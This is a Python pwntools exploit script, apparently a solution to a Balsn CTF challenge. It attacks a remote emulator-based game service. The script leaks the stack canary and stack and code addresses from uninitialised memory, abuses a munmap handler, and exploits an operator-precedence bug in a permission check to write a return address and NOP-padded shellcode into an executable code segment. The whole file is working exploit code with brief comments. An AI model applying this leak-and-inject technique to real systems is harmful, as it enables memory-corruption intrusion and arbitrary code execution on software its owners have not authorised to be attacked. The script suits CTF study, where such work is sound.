#!/usr/bin/env python3
from pwn import remote, process, context, p32, p64, u64, asm, log
from game.game_structs import *
context.arch = 'amd64'

#context.log_level = 0
r = remote('unicorn.balsnctf.com', 10101)
state = None

def decode_state():
    global state
    r.recvn(1)

    read_size = ctypes.sizeof(confrontState) - 8 * MAX_WEAPON_IDX - 8
    state_size = ctypes.sizeof(confrontState)
    state = confrontState.from_buffer_copy(b'\0' * 8 + r.recvn(read_size).ljust(state_size - 8))
    # for field in state._fields_:
    #     if type(getattr(state, field[0])) == int and getattr(state, field[0]) > 10000000:
    #         print(f'{field[0]}: {hex(getattr(state, field[0]))}')
    #     else:
    #         print(f'{field[0]}: {getattr(state, field[0])}')

def sendmsg(act, decode=True):
    bs = bytearray(act)
    r.send(p32(len(bs)))
    r.send(bs)

    if decode:
        decode_state()

# randomly call some function to fill stack with addresses
ac = actionStruct()
ac.action = STARTBATTLE
sendmsg(ac)

ac = actionStruct()
ac.action = ATTACK
sendmsg(ac)

ac = actionStruct()
ac.action = RETREAT
sendmsg(ac)

# leak addresses from startBattleStruct.desc
ac = actionStruct()
ac.action = STARTBATTLE
ac.stru.startBattleStruct.namelen = MAX_NAME_LEN
ac.stru.startBattleStruct.desclen = MAX_DESC_LEN
bs = bytearray(ac)
r.send(p32(8 * 3))
r.send(bs[:24])
decode_state()

leak = bytearray(state)
canary = u64(leak[0x260:0x268])
stack = u64(leak[0x268:0x270]) & ~0xfff
text = u64(leak[0x298:0x2a0]) & ~0xfff

log.info(f'canary: {hex(canary)}, stack: {hex(stack)}, text: {hex(text)}')

ac = actionStruct()
ac.action = ATTACK
sendmsg(ac)

ac = actionStruct()
ac.action = RETREAT
sendmsg(ac)

# set parameters for munmap(0, stack+0xcf8)
# abusing munmap handler to make it set rax = 0 and step into read handler
# be careful that pages on CONFRONT_STATE_ADDR will be unmapped
ac = actionStruct()
ac.action = STARTBATTLE
ac.stru.startBattleStruct.namelen = 1
ac.stru.startBattleStruct.name[0] = 0x41
ac.stru.startBattleStruct.desclen = MAX_DESC_LEN
ac.stru.startBattleStruct.desc[:] = b'\0'*(MAX_DESC_LEN-16) + p64(0) + p64(stack+0xcf8) # offset 0xcc0 is canary when read exit
sendmsg(ac)

ac = actionStruct()
ac.action = DISPOSEWEAPON
ac.stru.switchWeaponStruct.targetIdx = SLOT_NONE
sendmsg(ac, decode=False)

payload = asm('''
    xor eax, eax
    sub rax, 1
    mov rdi, rax
    mov rsi, rax
    mov rdx, rax
    mov r10, rax
    mov r8, rax
    mov r9, rax
    mov al, 'u'
    mov dil, 'n'
    mov sil, 'i'
    mov dl, 'c'
    mov r10b, 'o'
    mov r8b, 'r'
    mov r9b, 'n'
    syscall
''').rjust(0x200, b'\x90') # without padding, it segfault

# write return address to the place where it calls munmap
# rdx will be set by epilogue, rdi will be the return address
r.send(p64(text + 0x934))

# there's a faulty check in handlerFetchMemList(), it will always return false:
# meml->mem->guestProt&guestProtRequired != guestProtRequired
# (lhs of it should be wrapped with parentheses)
# so we can actually write to r-x code segment (from return address)
r.send(payload)

r.interactive()
